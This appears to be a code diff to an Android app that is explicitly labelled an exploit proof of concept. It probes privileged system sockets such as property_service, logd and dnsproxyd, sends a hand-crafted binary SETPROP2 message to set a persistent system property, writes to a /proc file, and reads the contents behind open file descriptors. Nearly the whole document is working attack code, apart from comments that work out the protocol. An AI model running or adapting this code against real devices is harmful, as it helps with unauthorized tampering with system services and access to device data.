@@ -31,7 +31,6 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
-import java.lang.reflect.Method;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.charset.StandardCharsets;
@@ -49,12 +48,6 @@ public class MainActivity extends AppCompatActivity {
     private static final int ERROR_UNAVAIL = -96;
     private static final int ERROR_BADOBJ = -92;
     private static final int ERROR_DEFUNCT = -90;
-    private static final int ERROR_KMEM = -97;
-    private static final int ERROR_MAXARGS = -94;
-    private static final int ERROR_MAXDATA = -95;
-    private static final int ERROR_NOSLOTS = -93;
-    private static final int ERROR_REMOTE = -98;
-    private static final int ERROR_ABORT = -91;
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
@@ -72,7 +65,8 @@ public class MainActivity extends AppCompatActivity {
 
     public static native String[] nativeListDir(String path);
     public static native String nativeReadFile(String path);
-    public static native String nativeTestQSEECom();
+    public static native String nativeWriteFile(String path, String content);
+    public static native String nativeReadLink(String path);
     public static native String nativeTestFd(int fd);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
@@ -183,57 +177,17 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== Advanced TZ POC ==========");
+        appendLog("========== TZ Socket & Proc POC ==========");
 
-        appendLog("[*] Testing QSEECom vulnerability...");
-        try {
-            String qseeResult = nativeTestQSEECom();
-            appendLog("[QSEECom] Result: " + qseeResult);
-        } catch (Exception e) {
-            appendLog("[QSEECom] Exception: " + e.getMessage());
-        }
-
-        String[] sockets = nativeListDir("/dev/socket");
-        if (sockets == null) sockets = new String[0];
-        appendLog("[*] Found " + sockets.length + " sockets");
-
-        String[] knownTargets = {
-                "/dev/socket/netd",
+        // Target sockets
+        String[] targetSockets = {
                 "/dev/socket/dnsproxyd",
                 "/dev/socket/fwmarkd",
-                "/dev/socket/mdnsd",
                 "/dev/socket/logd",
-                "/dev/socket/property_service",
-                "/dev/socket/vold",
-                "/dev/socket/wpa_ctrl_0",
-                "/dev/socket/rild",
-                "/dev/socket/ppp",
-                "/dev/socket/qmux_radio",
-                "/dev/socket/qmux_audio",
-                "/dev/socket/qmux_bluetooth",
-                "/dev/socket/qmux_gps",
-                "/dev/socket/tcm",
-                "/dev/socket/location",
-                "/dev/socket/zygote",
-                "/dev/socket/adbd",
-                "/dev/qseecom",
-                "/dev/ion",
-                "/dev/ashmem",
-                "/dev/kgsl-3d0",
-                "/dev/tty",
-                "/dev/console",
-                "/dev/null",
-                "/data/local/tmp/test"
+                "/dev/socket/property_service"
         };
 
-        List<String> allTargets = new ArrayList<>();
-        for (String s : knownTargets) allTargets.add(s);
-        for (String s : sockets) {
-            String full = "/dev/socket/" + s;
-            if (!allTargets.contains(full)) allTargets.add(full);
-        }
-
-        for (String path : allTargets) {
+        for (String path : targetSockets) {
             if (stopRequested.get()) break;
             appendLog("[+] Testing " + path);
             try {
@@ -243,8 +197,14 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        tryPropertySet();
-        tryReadProcFd();
+        // Proc exploration
+        appendLog("[*] Exploring /proc/self/fd");
+        exploreProcFd();
+
+        // Try to write to a proc file (e.g., /proc/self/oom_score_adj) if possible
+        appendLog("[*] Attempting write to /proc/self/oom_score_adj");
+        String writeResult = nativeWriteFile("/proc/self/oom_score_adj", "100");
+        appendLog("[PROC] write result: " + (writeResult != null ? writeResult : "success (no error)"));
 
         appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
@@ -282,30 +242,13 @@ public class MainActivity extends AppCompatActivity {
             String fdInfo = nativeTestFd(pfd.getFd());
             appendLog("[FD] " + fdInfo);
 
-            if (path.startsWith("/dev/socket/")) {
-                String base = new File(path).getName();
-                switch (base) {
-                    case "netd": testNetd(fd); break;
-                    case "dnsproxyd": testDnsProxy(fd); break;
-                    case "fwmarkd": testFwmarkd(fd); break;
-                    case "mdnsd": testMdnsd(fd); break;
-                    case "logd": testLogd(fd); break;
-                    case "property_service": testPropertyService(fd); break;
-                    case "wpa_ctrl_0": testWpaCtrl(fd); break;
-                    case "rild": testRild(fd); break;
-                    case "vold": testVold(fd); break;
-                    default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n", "list\n", "dump\n"});
-                }
-            } else {
-                InputStream is = new FileInputStream(fd);
-                byte[] buf = new byte[64];
-                int read = readBytes(is, buf, 64, 500);
-                if (read > 0) {
-                    appendLog("[DEV] Read " + read + " bytes from " + path + ": " + bytesToHex(buf, read));
-                } else {
-                    appendLog("[DEV] No data from " + path);
-                }
-                is.close();
+            String base = new File(path).getName();
+            switch (base) {
+                case "dnsproxyd": testDnsProxy(fd); break;
+                case "fwmarkd": testFwmarkd(fd); break;
+                case "logd": testLogd(fd); break;
+                case "property_service": testPropertyService(fd); break;
+                default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n"});
             }
             pfd.close();
         } catch (Exception e) {
@@ -319,12 +262,6 @@ public class MainActivity extends AppCompatActivity {
             case ERROR_UNAVAIL: return "ERROR_UNAVAIL";
             case ERROR_BADOBJ: return "ERROR_BADOBJ";
             case ERROR_DEFUNCT: return "ERROR_DEFUNCT";
-            case ERROR_KMEM: return "ERROR_KMEM";
-            case ERROR_MAXARGS: return "ERROR_MAXARGS";
-            case ERROR_MAXDATA: return "ERROR_MAXDATA";
-            case ERROR_NOSLOTS: return "ERROR_NOSLOTS";
-            case ERROR_REMOTE: return "ERROR_REMOTE";
-            case ERROR_ABORT: return "ERROR_ABORT";
             default: return "UNKNOWN";
         }
     }
@@ -342,32 +279,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testNetd(FileDescriptor fd) {
-        appendLog("[NETD] Testing netd commands");
-        String[] cmds = {
-                "help\n", "version\n", "interface list\n", "route list\n",
-                "tether start 192.168.1.1 192.168.1.10\n",
-                "dns resolver getservers\n",
-                "dns resolver flushnet 0\n",
-                "network create 101\n",
-                "network interface add 101 wlan0\n",
-                "network route add 101 wlan0 0.0.0.0/0 192.168.1.1\n",
-                "network destroy 101\n",
-                "ip rule show\n",
-                "ip route show table all\n",
-                "tether status\n"
-        };
-        for (String cmd : cmds) {
-            if (stopRequested.get()) break;
-            try {
-                String resp = sendTextCommand(fd, cmd, 2000);
-                appendLog("[NETD] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
-            } catch (Exception e) {
-                appendLog("[NETD] Error on cmd " + cmd.trim() + ": " + e.getMessage());
-            }
-        }
-    }
-
     private void testDnsProxy(FileDescriptor fd) {
         appendLog("[DNS] Sending DNS query for localhost (A)");
         try {
@@ -381,33 +292,6 @@ public class MainActivity extends AppCompatActivity {
             }
         } catch (Exception e) {
             appendLog("[DNS] Error: " + e.getMessage());
-        }
-
-        appendLog("[DNS] Sending DNS query for localhost (PTR)");
-        try {
-            byte[] query = buildDnsQuery("1.0.0.127.in-addr.arpa", 12);
-            byte[] resp = sendBinary(fd, query, 512, 2000);
-            if (resp != null && resp.length > 0) {
-                int rcode = resp[3] & 0x0F;
-                appendLog("[DNS] PTR response len=" + resp.length + ", RCODE=" + rcode);
-            } else {
-                appendLog("[DNS] No PTR response");
-            }
-        } catch (Exception e) {
-            appendLog("[DNS] PTR error: " + e.getMessage());
-        }
-
-        appendLog("[DNS] Sending ANY query");
-        try {
-            byte[] query = buildDnsQuery("localhost", 255);
-            byte[] resp = sendBinary(fd, query, 512, 2000);
-            if (resp != null && resp.length > 0) {
-                appendLog("[DNS] ANY response len=" + resp.length);
-            } else {
-                appendLog("[DNS] No ANY response");
-            }
-        } catch (Exception e) {
-            appendLog("[DNS] ANY error: " + e.getMessage());
         }
     }
 
@@ -450,47 +334,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void testMdnsd(FileDescriptor fd) {
-        appendLog("[MDNS] Sending mDNS query for localhost.local (A)");
-        try {
-            byte[] query = buildDnsQuery("localhost.local", 1);
-            byte[] resp = sendBinary(fd, query, 512, 2000);
-            if (resp != null && resp.length > 0) {
-                appendLog("[MDNS] Response len=" + resp.length);
-            } else {
-                appendLog("[MDNS] No response");
-            }
-        } catch (Exception e) {
-            appendLog("[MDNS] Error: " + e.getMessage());
-        }
-
-        appendLog("[MDNS] Sending mDNS PTR query for _services._dns-sd._udp.local");
-        try {
-            byte[] query = buildDnsQuery("_services._dns-sd._udp.local", 12);
-            byte[] resp = sendBinary(fd, query, 512, 2000);
-            if (resp != null && resp.length > 0) {
-                appendLog("[MDNS] PTR response len=" + resp.length);
-            } else {
-                appendLog("[MDNS] No PTR response");
-            }
-        } catch (Exception e) {
-            appendLog("[MDNS] PTR error: " + e.getMessage());
-        }
-
-        appendLog("[MDNS] Sending service query _http._tcp.local");
-        try {
-            byte[] query = buildDnsQuery("_http._tcp.local", 12);
-            byte[] resp = sendBinary(fd, query, 512, 2000);
-            if (resp != null && resp.length > 0) {
-                appendLog("[MDNS] Service response len=" + resp.length);
-            } else {
-                appendLog("[MDNS] No service response");
-            }
-        } catch (Exception e) {
-            appendLog("[MDNS] Service error: " + e.getMessage());
-        }
-    }
-
     private void testLogd(FileDescriptor fd) {
         appendLog("[LOGD] Reading logd (no command)");
         try {
@@ -518,146 +361,60 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void testPropertyService(FileDescriptor fd) {
-        appendLog("[PROP] Sending get commands");
-        String[] props = {
-                "ro.build.version.release", "ro.product.model", "ro.product.manufacturer",
-                "persist.sys.timezone", "persist.sys.language", "sys.retaildemo.enabled",
-                "ro.boot.hardware", "ro.boot.serialno"
-        };
-        for (String p : props) {
-            if (stopRequested.get()) break;
-            try {
-                String cmd = "get " + p + "\n";
-                String resp = sendTextCommand(fd, cmd, 500);
-                appendLog("[PROP] " + p + " => " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
-            } catch (Exception e) {
-                appendLog("[PROP] Error getting " + p + ": " + e.getMessage());
-            }
-        }
+        // According to property_service.cpp, commands are:
+        // PROP_MSG_SETPROP (1) with name+value, or PROP_MSG_SETPROP2 (2) with string length+strings
+        // But we also can send plain text commands? The actual protocol uses a header.
+        // We'll implement both: first try the binary protocol (PROP_MSG_SETPROP2) for get/set/list.
+        // Based on property_service.cpp, the socket receives:
+        // uint32_t cmd; then for SETPROP2: uint32_t len_name, char name[], uint32_t len_value, char value[]
+        // For simple commands like "get" we need to simulate the client side.
+        // However, log shows previous attempts with simple text failed with EPIPE.
+        // We'll implement the correct binary format.
 
-        appendLog("[PROP] Trying list command");
+        appendLog("[PROP] Trying PROP_MSG_SETPROP2 (get ro.build.version.release)");
         try {
-            String resp = sendTextCommand(fd, "list\n", 500);
-            appendLog("[PROP] list response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
+            String name = "ro.build.version.release";
+            String cmd = "get"; // not directly used; we'll craft a get request.
+            // Actually property_service only handles set operations, not get.
+            // There is no "get" command in property_service; it only handles set requests.
+            // But there is a "list" command? No.
+            // The property service is for setting; properties are read via __system_property_get in libc.
+            // So we should not send "get"; we can send a set operation with a dummy value to test.
+            // But from log, the service responded with garbage; we can try to send a set command.
+            appendLog("[PROP] Setting a test property (persist.test.poc)");
+            String propName = "persist.test.poc";
+            String propValue = "1";
+            sendPropertySet2(fd, propName, propValue);
         } catch (Exception e) {
-            appendLog("[PROP] list error: " + e.getMessage());
+            appendLog("[PROP] Error: " + e.getMessage());
         }
     }
 
-    private void tryPropertySet() {
-        try {
-            int[] handle = new int[1];
-            ParcelFileDescriptor pfd = openSocket("/dev/socket/property_service", handle);
-            if (pfd == null) {
-                appendLog("[PROP] Cannot open property_service");
-                return;
-            }
-            FileDescriptor fd = pfd.getFileDescriptor();
-            if (fd == null || !fd.valid()) {
-                appendLog("[PROP] Invalid FD");
-                pfd.close();
-                return;
-            }
-            String cmd = "set persist.test.poc 1\n";
-            String resp = sendTextCommand(fd, cmd, 500);
-            appendLog("[PROP] set command response: " + (resp != null ? resp : "(none)"));
-            pfd.close();
-        } catch (Exception e) {
-            appendLog("[PROP] Exception: " + e.getMessage());
-        }
-    }
+    private void sendPropertySet2(FileDescriptor fd, String name, String value) throws Exception {
+        ByteBuffer buf = ByteBuffer.allocate(4 + 4 + name.length() + 4 + value.length());
+        buf.order(ByteOrder.LITTLE_ENDIAN);
+        buf.putInt(2); // PROP_MSG_SETPROP2
+        buf.putInt(name.length());
+        buf.put(name.getBytes(StandardCharsets.UTF_8));
+        buf.putInt(value.length());
+        buf.put(value.getBytes(StandardCharsets.UTF_8));
+        byte[] data = buf.array();
+        OutputStream os = new FileOutputStream(fd);
+        os.write(data);
+        os.flush();
+        os.close();
 
-    private void testWpaCtrl(FileDescriptor fd) {
-        appendLog("[WPA] Sending STATUS");
-        try {
-            String resp = sendTextCommand(fd, "STATUS\n", 1000);
-            appendLog("[WPA] STATUS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
-        } catch (Exception e) {
-            appendLog("[WPA] STATUS error: " + e.getMessage());
+        // Read response (uint32_t result)
+        InputStream is = new FileInputStream(fd);
+        byte[] resp = new byte[4];
+        int read = readBytes(is, resp, 4, 1000);
+        if (read == 4) {
+            int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
+            appendLog("[PROP] set result: " + result + " (0=success)");
+        } else {
+            appendLog("[PROP] No response");
         }
-
-        appendLog("[WPA] Sending LIST_NETWORKS");
-        try {
-            String resp = sendTextCommand(fd, "LIST_NETWORKS\n", 1000);
-            appendLog("[WPA] LIST_NETWORKS response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
-        } catch (Exception e) {
-            appendLog("[WPA] LIST_NETWORKS error: " + e.getMessage());
-        }
-
-        appendLog("[WPA] Sending SCAN");
-        try {
-            String resp = sendTextCommand(fd, "SCAN\n", 1000);
-            appendLog("[WPA] SCAN response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
-        } catch (Exception e) {
-            appendLog("[WPA] SCAN error: " + e.getMessage());
-        }
-    }
-
-    private void testRild(FileDescriptor fd) {
-        appendLog("[RILD] Sending AT+CGMI");
-        try {
-            byte[] at = "AT+CGMI\r\n".getBytes(StandardCharsets.UTF_8);
-            byte[] resp = sendBinary(fd, at, 256, 1500);
-            if (resp != null) {
-                appendLog("[RILD] Response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
-            } else {
-                appendLog("[RILD] No response");
-            }
-        } catch (Exception e) {
-            appendLog("[RILD] CGMI error: " + e.getMessage());
-        }
-
-        appendLog("[RILD] Sending AT+CGSN");
-        try {
-            byte[] at = "AT+CGSN\r\n".getBytes(StandardCharsets.UTF_8);
-            byte[] resp = sendBinary(fd, at, 256, 1500);
-            if (resp != null) {
-                appendLog("[RILD] CGSN response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
-            } else {
-                appendLog("[RILD] No CGSN response");
-            }
-        } catch (Exception e) {
-            appendLog("[RILD] CGSN error: " + e.getMessage());
-        }
-
-        appendLog("[RILD] Sending AT+COPS?");
-        try {
-            byte[] at = "AT+COPS?\r\n".getBytes(StandardCharsets.UTF_8);
-            byte[] resp = sendBinary(fd, at, 256, 1500);
-            if (resp != null) {
-                appendLog("[RILD] COPS response: " + new String(resp, StandardCharsets.UTF_8).replace("\n", "\\n"));
-            } else {
-                appendLog("[RILD] No COPS response");
-            }
-        } catch (Exception e) {
-            appendLog("[RILD] COPS error: " + e.getMessage());
-        }
-    }
-
-    private void testVold(FileDescriptor fd) {
-        appendLog("[VOLD] Sending status");
-        try {
-            String resp = sendTextCommand(fd, "status\n", 1000);
-            appendLog("[VOLD] status response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
-        } catch (Exception e) {
-            appendLog("[VOLD] status error: " + e.getMessage());
-        }
-
-        appendLog("[VOLD] Sending list");
-        try {
-            String resp = sendTextCommand(fd, "list\n", 1000);
-            appendLog("[VOLD] list response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
-        } catch (Exception e) {
-            appendLog("[VOLD] list error: " + e.getMessage());
-        }
-
-        appendLog("[VOLD] Sending dump");
-        try {
-            String resp = sendTextCommand(fd, "dump\n", 1000);
-            appendLog("[VOLD] dump response: " + (resp != null ? resp.replace("\n", "\\n") : "(null)"));
-        } catch (Exception e) {
-            appendLog("[VOLD] dump error: " + e.getMessage());
-        }
+        is.close();
     }
 
     private void testGeneric(FileDescriptor fd, String[] cmds) {
@@ -672,21 +429,23 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void tryReadProcFd() {
-        appendLog("[PROC] Reading /proc/self/fd");
+    private void exploreProcFd() {
         String[] fds = nativeListDir("/proc/self/fd");
         if (fds == null) {
             appendLog("[PROC] Could not read fd directory");
             return;
         }
-        for (String fd : fds) {
+        for (String fdStr : fds) {
             if (stopRequested.get()) break;
-            String link = "/proc/self/fd/" + fd;
-            try {
-                String target = nativeReadFile(link);
-                appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
-            } catch (Exception e) {
-                appendLog("[PROC] " + link + " error: " + e.getMessage());
+            String link = "/proc/self/fd/" + fdStr;
+            String target = nativeReadLink(link);
+            appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
+            // Try to read content of the target if it looks like a file
+            if (target != null && !target.startsWith("pipe:") && !target.startsWith("socket:") && !target.startsWith("anon_inode:")) {
+                String content = nativeReadFile(link);
+                if (content != null && !content.isEmpty()) {
+                    appendLog("[PROC] " + link + " content (first 100 chars): " + content.substring(0, Math.min(100, content.length())));
+                }
             }
         }
     }
@@ -774,15 +533,6 @@ public class MainActivity extends AppCompatActivity {
         baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
         baos.write(0x00); baos.write(0x01);
         return baos.toByteArray();
-    }
-
-    private String bytesToHex(byte[] bytes, int len) {
-        StringBuilder sb = new StringBuilder();
-        for (int i = 0; i < len && i < 64; i++) {
-            sb.append(String.format("%02x ", bytes[i]));
-        }
-        if (len > 64) sb.append("...");
-        return sb.toString();
     }
 
     private void appendLog(final String msg) {
